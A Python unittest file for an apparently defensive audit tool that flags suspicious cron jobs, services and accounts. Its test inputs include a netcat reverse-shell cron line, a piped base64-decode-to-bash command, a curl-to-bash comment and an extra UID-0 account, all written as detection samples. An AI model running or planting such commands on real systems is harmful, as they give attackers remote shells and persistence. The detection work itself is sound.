import sys
from pathlib import Path
import subprocess
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'lib'))
from anomaly_audit import account_findings, scan_text, command_snapshot


class AuditTests(unittest.TestCase):
    def test_reverse_shell_persistence_flagged(self):
        findings = scan_text('/etc/cron.d/test', '* * * * * root nc host 4444 -e /bin/sh')
        self.assertEqual(findings[0]['rule'], 'shell-network')
        self.assertIn('Possible', findings[0]['assessment'])

    def test_comments_and_benign_service_not_flagged(self):
        self.assertEqual(scan_text('test', '# curl example | bash\nExecStart=/usr/sbin/sshd -D'), [])

    def test_temp_service_and_encoded_execution_flagged(self):
        rules = {f['rule'] for f in scan_text('test', 'ExecStart=/tmp/helper\nbase64 -d payload | bash')}
        self.assertEqual(rules, {'temporary-persistence', 'encoded-execute'})

    def test_uid_zero_and_unlisted_user_reported_without_actions(self):
        source = 'root:x:0:0:root:/root:/bin/bash\noperator:x:1000:1000::/home/operator:/bin/bash\nextra:x:1001:1001::/home/extra:/bin/bash\nalias:x:0:0::/root:/bin/bash'
        findings = account_findings(source, {'operator'})
        self.assertEqual({f['rule'] for f in findings}, {'unlisted-account', 'extra-uid-zero', 'system-account-login-shell'})
        self.assertFalse(any(f.get('account') == 'operator' for f in findings))

    def test_no_readme_does_not_guess_unauthorized_accounts(self):
        self.assertEqual(account_findings('operator:x:1000:1000::/home/operator:/bin/bash'), [])

    def test_snapshot_is_shell_free_and_timeout_reported(self):
        with patch('anomaly_audit.subprocess.run', side_effect=subprocess.TimeoutExpired(['ss'], 20)) as execute:
            self.assertIn('error', command_snapshot(['ss', '-lntu']))
            self.assertNotIn('shell', execute.call_args.kwargs)
            self.assertEqual(execute.call_args.args[0], ['ss', '-lntu'])


if __name__ == '__main__': unittest.main()
